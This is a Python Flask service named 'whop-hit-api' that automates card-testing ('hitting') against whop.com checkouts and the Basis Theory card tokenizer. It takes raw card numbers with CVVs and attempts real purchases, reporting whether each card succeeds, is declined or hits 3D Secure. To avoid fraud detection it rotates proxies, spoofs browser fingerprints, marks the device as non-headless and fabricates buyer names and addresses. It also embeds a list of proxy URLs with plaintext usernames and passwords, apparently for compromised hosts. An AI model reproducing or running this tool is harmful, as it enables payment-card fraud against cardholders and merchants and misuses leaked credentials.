#!/usr/bin/env python3
"""
whop-hit-api — Railway-deployable HTTP wrapper around the whop checkout hitter.

Endpoints:
  GET  /                 → health
  GET  /checkout?checkout=<url>&cc=<num|mm|yy|cvv>&proxy=<proxy>&email=<email>
  POST /checkout         → JSON body {"checkout": "...", "cc": "...", "proxy": "...", "email": "..."}
Auth (optional): X-API-Key header must equal env SERVICE_API_KEY if set.
"""

import os, re, json, uuid, random, time, base64
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timezone, timedelta

import urllib3
from flask import Flask, request, jsonify
from curl_cffi import requests as curl_requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

SERVICE_API_KEY     = os.environ.get("SERVICE_API_KEY", "").strip()
BT_API_KEY_DEFAULT  = os.environ.get("BT_API_KEY", "").strip()

# ═══════════════════════════════════════════════════════════════════════
# DEFAULT PROXIES  — override per-request with ?proxy=
# ═══════════════════════════════════════════════════════════════════════
DEFAULT_PROXIES = [
    "http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
    "http://s6003026810028:1720800122226@202.28.17.8:8080",
    "http://s6304046610189:0802503473Za@202.28.17.5:8080",
    "http://s6301074610292:za0643250344@202.28.17.8:8080",
    "http://s6202052810029:78496978@202.28.17.8:8080",
    "http://1101400099291:mooyor4556@202.41.171.9:2086",
    "http://3102002486968:gaogaigar@202.41.171.9:2086",
    "http://1909900310292:idAidA0505@202.41.171.9:2086",
    "http://3700900107896:ratchaburi79@202.41.171.9:2086",
    "http://s6102032620021:fahfah090908@202.28.17.5:8080",
    "http://s5802016810053:1549900215617@202.28.17.8:8080",
    "http://s6402011520288:surikan123@202.28.17.5:8080",
    "http://s5703051618246:ablahum775@202.28.17.5:8080",
    "http://s6402013510115:s1609900520681@202.28.17.8:8080",
    "http://s6302012630029:Sick22241@202.28.17.5:8080",
    "http://21281002:Cangul12345@193.140.28.22:3128",
    "http://root:Super!123Gus@157.230.95.55:4242",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
]

# ═══════════════════════════════════════════════════════════════════════
# DATA TABLES  (same as local hitter)
# ═══════════════════════════════════════════════════════════════════════
FIRST_NAMES = ["James","Michael","Robert","David","William","John","Alex","Sam","Chris","Ryan"]
LAST_NAMES  = ["Wilson","Smith","Johnson","Brown","Williams","Jones","Davis","Miller","Garcia","Martinez"]

STATE_ZIPS = {
    "AL":"35004","AK":"99501","AZ":"85001","AR":"72201","CA":"90001","CO":"80201",
    "CT":"06101","DE":"19801","FL":"33101","GA":"30301","HI":"96801","ID":"83201",
    "IL":"60601","IN":"46201","IA":"50301","KS":"66002","KY":"40201","LA":"70112",
    "ME":"04032","MD":"21201","MA":"02101","MI":"48201","MN":"55101","MS":"39201",
    "MO":"63101","MT":"59001","NE":"68102","NV":"89101","NH":"03031","NJ":"07001",
    "NM":"87501","NY":"10001","NC":"27501","ND":"58102","OH":"44101","OK":"73099",
    "OR":"97001","PA":"19019","RI":"02840","SC":"29201","SD":"57101","TN":"37201",
    "TX":"77001","UT":"84044","VT":"05601","VA":"23218","WA":"98001","WV":"24701",
    "WI":"53001","WY":"82001",
}
STATE_CITY = {
    "CA":"Los Angeles","TX":"Houston","FL":"Miami","NY":"New York","WA":"Seattle",
    "CO":"Denver","MI":"Detroit","GA":"Atlanta","AZ":"Phoenix","OH":"Cleveland",
    "IL":"Chicago","PA":"Philadelphia","NC":"Charlotte","VA":"Richmond","MA":"Boston",
    "NJ":"Newark","MD":"Baltimore","MO":"St. Louis","OR":"Portland",
}
STREETS = ["Evergreen Terrace","Main Street","Oak Avenue","Sunset Boulevard","Maple Drive"]

SCREEN_RESOLUTIONS = [
    (1920,1080),(1366,768),(1536,864),(1440,900),(1280,720),
    (2560,1440),(1680,1050),(1600,900),(800,1280),(390,844),
    (412,915),(360,740),(375,667),(414,896),
]
PLATFORMS = ["Win32","MacIntel"]
LANGUAGES = ["en-US","en-GB","en-IN","en-CA","en-AU"]
TIMEZONES = ["America/New_York","America/Chicago","America/Denver","America/Los_Angeles",
             "Europe/London","Europe/Paris","Asia/Tokyo","Asia/Calcutta","Australia/Sydney"]
TZ_OFFSETS = {
    "America/New_York":-240,"America/Chicago":-300,"America/Denver":-360,
    "America/Los_Angeles":-420,"Europe/London":60,"Europe/Paris":120,
    "Asia/Tokyo":540,"Asia/Calcutta":330,"Australia/Sydney":600,
}
WEBGL_VENDORS = [
    ("Google Inc. (NVIDIA)","ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Laptop GPU Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ("Google Inc. (NVIDIA)","ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ("Intel Inc.","ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ("Apple Inc.","Apple M1"),
    ("Google Inc. (AMD)","ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
]
PLUGINS_SETS = [
    ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","Microsoft Edge PDF Viewer","WebKit built-in PDF"],
    ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","WebKit built-in PDF"],
    ["PDF Viewer","Chrome PDF Viewer","WebKit built-in PDF"],
]

# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════
def luhn_ok(number):
    digits = [int(d) for d in str(number)][::-1]
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def random_email():
    return f"{random.choice(FIRST_NAMES).lower()}.{random.choice(LAST_NAMES).lower()}{random.randint(1,9999)}@gmail.com"

def random_address():
    state = random.choice(list(STATE_ZIPS.keys()))
    return {
        "line1": f"{random.randint(100,9999)} {random.choice(STREETS)}",
        "city": STATE_CITY.get(state, "Springfield"),
        "state": state,
        "postal": STATE_ZIPS[state],
        "country": "US",
    }

def gen_trace(): return str(uuid.uuid4()).replace("-", "")
def gen_span():  return uuid.uuid4().hex[:16]

def gen_baggage(trace_id, release):
    sample_rand = str(uuid.uuid4().int % 10000000000000000 / 10000000000000000)[:17]
    return (f"sentry-environment=production,sentry-release={release},"
            f"sentry-public_key=c6989961c9181cc2db941b290d874f29,"
            f"sentry-trace_id={trace_id},sentry-org_id=1320754,"
            f"sentry-sampled=false,sentry-sample_rand={sample_rand},"
            f"sentry-sample_rate=1")

def extract_dynamic(html):
    next_data = None
    m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html, re.S)
    if m:
        try: next_data = json.loads(m.group(1))
        except Exception: pass

    def rec(obj, pat):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str):
                    mm = re.search(pat, v)
                    if mm: return mm.group(0)
                elif isinstance(v, (dict, list)):
                    res = rec(v, pat)
                    if res: return res
        elif isinstance(obj, list):
            for item in obj:
                res = rec(item, pat)
                if res: return res
        return None

    def find_plan(obj):
        if isinstance(obj, dict):
            if obj.get("id","").startswith("plan_") and (
                "formattedPeriodV2" in obj or "initialPrice" in obj or "rawInitialPrice" in obj
            ): return obj.get("id")
            for k, v in obj.items():
                res = find_plan(v)
                if res: return res
        elif isinstance(obj, list):
            for item in obj:
                res = find_plan(item)
                if res: return res
        return None

    plan_id = account_id = container = release = product_id = slug = None
    if next_data:
        plan_id    = find_plan(next_data) or rec(next_data, r'plan_[a-zA-Z0-9]+')
        account_id = rec(next_data, r'biz_[a-zA-Z0-9]+')
        container  = rec(next_data, r'/card-assembly/[a-zA-Z0-9]+/')
        release    = rec(next_data, r'[a-f0-9]{40}')
        product_id = rec(next_data, r'prod_[a-zA-Z0-9]+')
        sm = re.search(r'"slug"\s*:\s*"([^"]+)"', html)
        if sm: slug = sm.group(1)
    if not plan_id:    plan_id    = (re.findall(r'plan_[a-zA-Z0-9]+', html) or [None])[0]
    if not account_id: account_id = (re.findall(r'biz_[a-zA-Z0-9]+', html) or [None])[0]
    if not product_id: product_id = (re.findall(r'prod_[a-zA-Z0-9]+', html) or [None])[0]
    if not container:
        m2 = re.search(r'/card-assembly/[a-zA-Z0-9]+/', html)
        if m2: container = m2.group(0)
    if not release:
        m2 = re.search(r'"release":"([a-f0-9]{40})"', html) or re.search(r'"buildId":"([a-f0-9]{40})"', html)
        if m2: release = m2.group(1)
    return plan_id, account_id, container, release or "unknown", product_id, slug

def get_message(resp):
    if not isinstance(resp, dict): return None
    for key in ("last_confirmation_error","last_confirm_error"):
        lce = resp.get(key)
        if isinstance(lce, dict) and lce.get("message"): return lce["message"]
    payment = resp.get("payment")
    if isinstance(payment, dict):
        for k in ("last_payment_error","error"):
            lpe = payment.get(k)
            if isinstance(lpe, dict) and lpe.get("message"): return lpe["message"]
        if payment.get("decline_code"): return f"Declined: {payment['decline_code']}"
        if payment.get("status","").lower() in ("failed","declined","canceled"):
            return payment.get("message") or payment["status"]
    if resp.get("decline_code"): return f"Declined: {resp['decline_code']}"
    if resp.get("status","").lower() in ("failed","declined","canceled"):
        return resp.get("message") or resp["status"]
    return None

def random_fingerprint():
    sw, sh = random.choice(SCREEN_RESOLUTIONS)
    platform = random.choice(PLATFORMS); lang = random.choice(LANGUAGES); tz = random.choice(TIMEZONES)
    hw = random.choice([2,4,8,12,16]); mem = random.choice([4,8,16])
    vendor, renderer = random.choice(WEBGL_VENDORS); plugins = random.choice(PLUGINS_SETS)
    dpr = random.choice([1.0,1.25,1.5,2.0])
    return {
        "screen_w": sw, "screen_h": sh, "platform": platform, "lang": lang, "tz": tz,
        "hw": hw, "mem": mem, "vendor": vendor, "renderer": renderer,
        "plugins": plugins, "tz_offset": TZ_OFFSETS.get(tz, 0), "dpr": dpr,
        "inner_w": int(sw*0.6)+random.randint(-50,50),
        "inner_h": int(sh*0.8)+random.randint(-50,50),
    }

def parse_cc(raw):
    """Accept num|mm|yy|cvv, num:mm:yy:cvv, num mm yy cvv."""
    parts = re.split(r"[|:\s,/]+", raw.strip())
    if len(parts) < 4: raise ValueError("cc must be number|mm|yy|cvv")
    num = re.sub(r"\D", "", parts[0])
    mon = re.sub(r"\D", "", parts[1])
    yr  = re.sub(r"\D", "", parts[2])
    cvv = re.sub(r"\D", "", parts[3])
    return num, mon, yr, cvv

# ═══════════════════════════════════════════════════════════════════════
# MAIN FLOW
# ═══════════════════════════════════════════════════════════════════════
def run_card(url, cc, proxy, btapi_override=None, email_override=None):
    session = curl_requests.Session(impersonate="chrome120")
    proxies = {"http": proxy, "https": proxy}

    fp = random_fingerprint()
    ua  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    sch = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'

    wuid = f"wuid_{uuid.uuid4().hex[:16]}"; ajs_id = str(uuid.uuid4())
    whop_anon = str(uuid.uuid4()); ssk = str(uuid.uuid4())

    referer = url
    parsed = urlparse(url)
    affiliate = parse_qs(parsed.query).get("a", [""])[0]
    slug = parsed.path.strip("/").split("/")[-1] if parsed.path else ""

    headers_get_doc = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0", "priority": "u=0, i",
        "sec-ch-ua": sch, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin", "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1", "user-agent": ua,
    }
    initial_cookies = {}
    if affiliate:
        initial_cookies["__Host-affiliate_code"] = affiliate
        if slug:
            initial_cookies[f"__Host-whop-core.affiliate-{slug}"] = affiliate
            initial_cookies[f"whop-core.affiliate-{slug}"] = affiliate
    initial_cookies["_wuid"] = wuid
    initial_cookies["_wuid_link"] = wuid
    initial_cookies["ajs_anonymous_id"] = ajs_id
    initial_cookies["whop_anonymous_id"] = whop_anon
    initial_cookies["whop-core.ssk"] = ssk
    initial_cookies["_whop_ssk"] = ssk
    for k, v in initial_cookies.items():
        session.cookies.set(k, v, domain="whop.com")

    r1 = session.get(url, headers=headers_get_doc, proxies=proxies, verify=False, timeout=30)
    html = r1.text
    plan_id, account_id, container, release, product_id, slug_extracted = extract_dynamic(html)
    if not plan_id or not account_id:
        return "Error: missing plan/account"
    if slug_extracted: slug = slug_extracted

    # affiliate resolve
    tracking_link_id = None
    if affiliate and product_id:
        t_resolve = gen_trace()
        rh = {
            "accept":"*/*","accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type":"application/json","origin":"https://whop.com","priority":"u=1, i",
            "referer":referer,"sec-ch-ua":sch,"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin",
            "sentry-trace":f"{t_resolve}-{gen_span()}-1","baggage":gen_baggage(t_resolve, release),
            "user-agent":ua,
        }
        try:
            rr = session.post("https://whop.com/api/affiliate/resolve-tracking/",
                              json={"companyId":account_id,"accessPassId":product_id},
                              headers=rh, proxies=proxies, verify=False, timeout=30)
            if rr.status_code == 200:
                dr = rr.json()
                tracking_link_id = dr.get("tracking_link_id") or dr.get("id") or dr.get("trackingLinkId")
                if tracking_link_id:
                    session.cookies.set(f"__Host-whop-core.tracking-link-{account_id}", tracking_link_id, domain="whop.com")
                    session.cookies.set(f"whop-core.tracking-link-{account_id}", tracking_link_id, domain="whop.com")
        except Exception: pass

    # tracking pixels
    try:
        session.get(f"https://whop.com/api/v1/accounts/{account_id}/tracking_pixels",
                    headers={"accept":"application/json","priority":"u=1, i","referer":referer,
                             "sec-ch-ua":sch,"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
                             "sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin",
                             "user-agent":ua},
                    proxies=proxies, verify=False, timeout=15)
    except Exception: pass

    # bt api key
    btapi = btapi_override
    if not btapi:
        env_match = re.search(r'href="(/_web/assets/[^/]+/env-[a-zA-Z0-9_-]+\.js)"', html)
        if env_match:
            try:
                r_env = session.get("https://whop.com" + env_match.group(1),
                                    headers=headers_get_doc, proxies=proxies, verify=False, timeout=30)
                bt_m = re.search(r'VITE_PAYOUTS_BASIS_THEORY_API_KEY:\s*[`\'"]([^`\'"]+)[`\'"]', r_env.text)
                if bt_m: btapi = bt_m.group(1)
            except Exception: pass
    if not btapi:
        m2 = re.search(r'key_prod_us_pub_[a-zA-Z0-9]+', html)
        btapi = m2.group(0) if m2 else "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"

    def whop_headers(trace_id, extra=None, is_doc=False):
        h = {
            "accept":"*/*","accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "api-version-date":"2026-08-21-1","origin":"https://whop.com","referer":referer,
            "sec-ch-ua":sch,"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest":"document" if is_doc else "empty",
            "sec-fetch-mode":"navigate" if is_doc else "cors",
            "sec-fetch-site":"same-origin","sec-gpc":"1","priority":"u=1, i",
            "sentry-trace":f"{trace_id}-{gen_span()}-1",
            "baggage":gen_baggage(trace_id, release),
            "whop-private-schema":"true",
            "x-fern-language":"JavaScript","x-fern-runtime":"browser",
            "x-fern-runtime-version":ua,"user-agent":ua,"x-ssk":ssk,
        }
        if extra: h.update(extra)
        return h

    # checkout_sessions
    t2 = gen_trace()
    payload2 = {"items":[{"plan":plan_id,"quantity":1}], "tracking_link_ids_by_account": {}}
    if affiliate:
        payload2["affiliate_code"] = affiliate
        payload2["attribution"] = {"source":"product_page_direct"}
    if tracking_link_id and account_id:
        payload2["tracking_link_ids_by_account"] = {account_id: tracking_link_id}
    r2 = session.post("https://whop.com/api/v1/checkout_sessions",
                      json=payload2, headers=whop_headers(t2),
                      proxies=proxies, verify=False, timeout=30)
    if r2.status_code >= 400:
        return f"Error: checkout_sessions {r2.status_code}"
    d2 = r2.json()
    chs_id        = d2.get("id","")
    client_secret = d2.get("client_secret","")
    account_id    = d2.get("seller",{}).get("id", account_id)
    email         = email_override or d2.get("buyer_email") or cc["email"]
    quote         = d2.get("quote",{})
    base_amount   = quote.get("base_amount", 0.0)
    base_currency = quote.get("base_currency","USD").upper()
    if not chs_id or not client_secret:
        return "Error: no checkout session"
    session.cookies.set(f"whop_checkout_key_{chs_id}", client_secret, domain="whop.com")

    # calculate_breakdown
    t3 = gen_trace()
    r3 = session.post(f"https://whop.com/api/v1/checkout_sessions/{chs_id}/calculate_breakdown",
                      json={"client_secret":client_secret,"supports_buyer_fee":True},
                      headers=whop_headers(t3), proxies=proxies, verify=False, timeout=30)
    final_amt, final_curr = base_amount, base_currency
    try:
        d3 = r3.json(); total = d3.get("total",{})
        if total.get("amount"):
            final_amt = total["amount"]; final_curr = total.get("currency","USD").upper()
    except Exception: pass

    # conversions
    try:
        session.post("https://t.whop.tw/conversions",
            json={"event_name":"identify","company_id":account_id,
                  "event_time":datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                  "url":url,"user":{"anonymous_id":wuid,"linked_anonymous_id":ajs_id},
                  "context":{"user_agent":ua,"screen_resolution":f"{fp['screen_w']}x{fp['screen_h']}",
                             "language":fp["lang"],"timezone":fp["tz"],
                             "fingerprint":uuid.uuid4().hex[:32],
                             "fingerprint_confidence":round(random.uniform(0.3,0.6),2)},
                  "referrer_url":url,"source":"link"},
            headers={"accept":"*/*","content-type":"application/json","origin":"https://whop.com",
                     "priority":"u=1, i","referer":"https://whop.com/","sec-ch-ua":sch,
                     "sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
                     "sec-fetch-dest":"empty","sec-fetch-mode":"cors",
                     "sec-fetch-site":"cross-site","user-agent":ua},
            proxies=proxies, verify=False, timeout=15)
    except Exception: pass

    # BT session
    device_info = {
        "uaBrands":[{"brand":"Not_A Brand","version":"8"},{"brand":"Chromium","version":"120"},{"brand":"Google Chrome","version":"120"}],
        "uaMobile":False,"uaPlatform":"Windows" if fp["platform"]=="Win32" else "macOS",
        "languages":[fp["lang"],"en"],"timeZone":fp["tz"],
        "cookiesEnabled":True,"localStorageEnabled":True,"sessionStorageEnabled":True,
        "platform":fp["platform"],"hardwareConcurrency":fp["hw"],"deviceMemoryGb":fp["mem"],
        "screenWidth":fp["screen_w"],"screenHeight":fp["screen_h"],
        "screenAvailWidth":fp["screen_w"],"screenAvailHeight":fp["screen_h"]-40,
        "innerWidth":fp["inner_w"],"innerHeight":fp["inner_h"],
        "devicePixelRatio":fp["dpr"],"maxTouchPoints":0,"network":{},
        "plugins":fp["plugins"],"mimeTypes":["application/pdf","text/pdf"],
        "webdriver":False,"suspectedHeadless":False,
        "webglVendor":fp["vendor"],"webglRenderer":fp["renderer"],
    }
    bt_device_b64 = base64.b64encode(json.dumps(device_info).encode()).decode()
    bt_headers = {
        "accept":"*/*","accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "bt-api-key":btapi,
        "origin":"https://js.basistheory.com",
        "referer":"https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html?element_id",
        "sec-ch-ua":sch,"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
        "sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin",
        "sec-fetch-storage-access":"active","user-agent":ua,
    }
    r4 = session.post("https://js.basistheory.com/api/sessions",
                      json={"deviceInfo":device_info}, headers=bt_headers,
                      proxies=proxies, verify=False, timeout=30)
    conkey, conon = "", ""
    try:
        d4 = r4.json(); conkey = d4.get("session_key",""); conon = d4.get("nonce","")
    except Exception: pass

    # card session
    t5 = gen_trace(); ws_headers = whop_headers(t5); ws_headers["referer"] = referer
    r5 = session.post("https://whop.com/api/v1/payment_method_types/card/session",
                      json={"account_id":account_id,"nonce":conon},
                      headers=ws_headers, proxies=proxies, verify=False, timeout=30)
    try:
        d5 = r5.json(); sc = d5.get("session",{}).get("container")
        if sc:
            container = sc if sc.startswith("/") else "/"+sc
            if not container.endswith("/"): container += "/"
    except Exception: pass
    if not container:
        container = "/card-assembly/cda4721bfd122ff8420a0bf4f47ea32e14125ef7d90d933bacb1a0b7fa9e82dd/"

    # BT tokenize (number only)
    exp_year = int(cc["year"])
    if exp_year < 100: exp_year += 2000
    expires_at = (datetime.now(timezone.utc)+timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    token_headers = {**bt_headers, "bt-api-key":btapi, "bt-device-info":bt_device_b64,
                     "content-type":"application/json"}
    r6 = session.post("https://js.basistheory.com/api/tokens",
        json={"type":"card","containers":[container],"expires_at":expires_at,
              "data":{"number":cc["number"]}},
        headers=token_headers, proxies=proxies, verify=False, timeout=30)
    card_token = None
    try: card_token = r6.json().get("id")
    except Exception: pass
    if not card_token: return "Error: no card token"

    # PATCH exp + cvc
    patch_headers = {**bt_headers, "bt-api-key":conkey, "bt-device-info":bt_device_b64,
                     "content-type":"application/merge-patch+json",
                     "referer":"https://js.basistheory.com/web-elements/2.12.2/hosted-elements/card-expiration-date-element.html?element_id=0da4cabc-a41a-4109-b050-eaad46bbc48b"}
    session.patch(f"https://js.basistheory.com/api/tokens/{card_token}",
                  json={"data":{"expiration_month":int(cc["month"]),"expiration_year":exp_year}},
                  headers=patch_headers, proxies=proxies, verify=False, timeout=30)
    patch_headers["referer"] = "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/card-verification-code-element.html?element_id=f4fa4112-998a-49d6-bf4b-691e08d3cfe0"
    session.patch(f"https://js.basistheory.com/api/tokens/{card_token}",
                  json={"data":{"cvc":cc["cvv"]}},
                  headers=patch_headers, proxies=proxies, verify=False, timeout=30)

    # confirmation_tokens
    t9 = gen_trace()
    h9 = whop_headers(t9, {"authorization":"Bearer public","referer":f"{url}?session={chs_id}"})
    payload9 = {
        "account_id": account_id,
        "payment_method": {"type":"card","category":"card","card":{"token":card_token}},
        "setup_future_usage":"off_session",
        "billing_details": {"email":email,"name":cc["name"],
                            "address":{"country":cc["country"],"line1":cc["line1"],
                                       "city":cc["city"],"state":cc["state"],
                                       "postal_code":cc["postal"]}},
        "return_url": f"{url}?session={chs_id}",
        "browser_info": {"platform":fp["platform"],"color_depth":24,
                         "screen_height":fp["screen_h"],"screen_width":fp["screen_w"],
                         "javascript_enabled":True,"language":fp["lang"],
                         "java_enabled":False,"browser_time_difference":fp["tz_offset"]},
    }
    r9 = session.post("https://whop.com/api/v1/confirmation_tokens",
                      json=payload9, headers=h9, proxies=proxies, verify=False, timeout=30)
    ctok_id = None
    try: ctok_id = r9.json().get("id")
    except Exception: pass
    if not ctok_id: return "Error: no confirmation token"

    # confirm
    t10 = gen_trace()
    h10 = whop_headers(t10, {"referer":f"{url}?session={chs_id}"})
    payload10 = {"client_secret":client_secret,"confirmation_token":ctok_id,
                 "attestations":{"tos_accepted":True}}
    r10 = session.post(f"https://whop.com/api/v1/checkout_sessions/{chs_id}/confirm",
                       json=payload10, headers=h10, proxies=proxies, verify=False, timeout=30)
    conf_json = {}
    try: conf_json = r10.json()
    except Exception: pass

    # poll
    for _ in range(12):
        cs_status   = conf_json.get("status","")
        payment     = conf_json.get("payment") or {}
        pay_status  = payment.get("status","")
        err_obj     = conf_json.get("last_confirm_error")
        next_action = conf_json.get("next_action") or {}
        na_type     = next_action.get("type","")

        msg = get_message(conf_json)
        if msg: return msg
        if na_type in ("use_stripe_sdk","redirect_to_url","3ds","complete"): return "3D Secure"
        if na_type == "wait_for_payment" and cs_status in ("open","completed") and pay_status in ("processing", None, ""):
            time.sleep(next_action.get("poll_after_seconds", 3))
            t_p = gen_trace()
            r_p = session.get(f"https://whop.com/api/v1/checkout_sessions/{chs_id}",
                              params={"client_secret":client_secret},
                              headers=whop_headers(t_p), proxies=proxies, verify=False, timeout=30)
            try: conf_json = r_p.json()
            except Exception: pass
            continue
        if pay_status == "succeeded" or (cs_status == "completed" and not err_obj and pay_status not in ("processing","requires_action")):
            return f"Payment Successful | {final_amt} {final_curr}"
        if cs_status in ("failed","expired"):
            return f"Failed: {cs_status}"
        break

    return f"Unknown: status={conf_json.get('status')} pay={payment.get('status')}"

# ═══════════════════════════════════════════════════════════════════════
# RESPONSE CLASSIFIER
# ═══════════════════════════════════════════════════════════════════════
def classify(result):
    r = (result or "").lower()
    if r.startswith("payment successful"): return "success"
    if r.startswith("declined"):            return "declined"
    if r.startswith("3d secure"):           return "3ds"
    if r.startswith("failed"):              return "declined"
    if r.startswith("error"):               return "error"
    return "pending"

# ═══════════════════════════════════════════════════════════════════════
# FLASK ROUTES
# ═══════════════════════════════════════════════════════════════════════
@app.route("/", methods=["GET"])
def health():
    return jsonify({
        "ok": True,
        "service": "whop-hit-api",
        "endpoint": "/checkout?checkout=<url>&cc=<num|mm|yy|cvv>&proxy=<proxy>&email=<optional>",
        "auth": "X-API-Key header required if SERVICE_API_KEY env is set",
    })

@app.route("/checkout", methods=["GET", "POST"])
def checkout():
    # auth
    if SERVICE_API_KEY:
        given = request.headers.get("X-API-Key") or request.args.get("key") or ""
        if given != SERVICE_API_KEY:
            return jsonify({"status":"error","message":"unauthorized"}), 401

    if request.method == "POST" and request.is_json:
        body = request.get_json(silent=True) or {}
    else:
        body = {}

    def pick(*names, default=None):
        for n in names:
            v = request.args.get(n) if n in request.args else body.get(n)
            if v: return v
        return default

    url    = pick("checkout","url","link")
    ccraw  = pick("cc","card")
    proxy  = pick("proxy")
    email  = pick("email")
    api_key = pick("api_key","bt_key") or BT_API_KEY_DEFAULT

    if not url or not ccraw:
        return jsonify({"status":"error","message":"missing 'checkout' or 'cc'"}), 400

    if not url.startswith("http"):
        url = "https://" + url

    try:
        num, mon, yr, cvv = parse_cc(ccraw)
    except Exception as e:
        return jsonify({"status":"error","message":str(e)}), 400

    if not luhn_ok(num):
        return jsonify({"status":"error","message":"card failed luhn"}), 400

    addr = random_address()
    cc = {
        "number": num, "month": mon.zfill(2), "year": yr, "cvv": cvv,
        "email": email or random_email(),
        "name": f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}",
        **addr,
    }

    if not proxy:
        proxy = random.choice(DEFAULT_PROXIES)

    masked = f"{num[:6]}******{num[-4:]}"
    t0 = time.time()
    try:
        result = run_card(url, cc, proxy, btapi_override=api_key, email_override=email)
    except Exception as e:
        result = f"Error: {e}"
    elapsed = round(time.time() - t0, 2)

    return jsonify({
        "status":   classify(result),
        "message":  result,
        "card":     masked,
        "amount":   None,
        "currency": None,
        "elapsed":  elapsed,
        "proxy":    proxy.split("@")[-1] if "@" in proxy else proxy,
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
